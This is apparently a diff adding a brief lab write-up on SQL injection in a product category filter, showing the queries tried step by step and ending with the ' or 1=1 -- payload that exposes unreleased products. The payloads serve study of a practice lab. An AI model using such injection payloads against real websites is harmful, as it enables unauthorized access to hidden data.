@@ -1,0 +1,22 @@
+Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+
+SQL injection: product category filter
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+Goal: display all product released and unreleased
+
+
+Analysis
+
+
+SELECT * FROM products WHERE category = 'Lifestyle' AND released = 1
+Ok
+
+SELECT * FROM products WHERE category = ''' AND released = 1
+Internal Server Error
+
+SELECT * FROM products WHERE category = ''--' AND released = 1
+not find category
+
+SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1
+comment the realese and show all product
+Solved
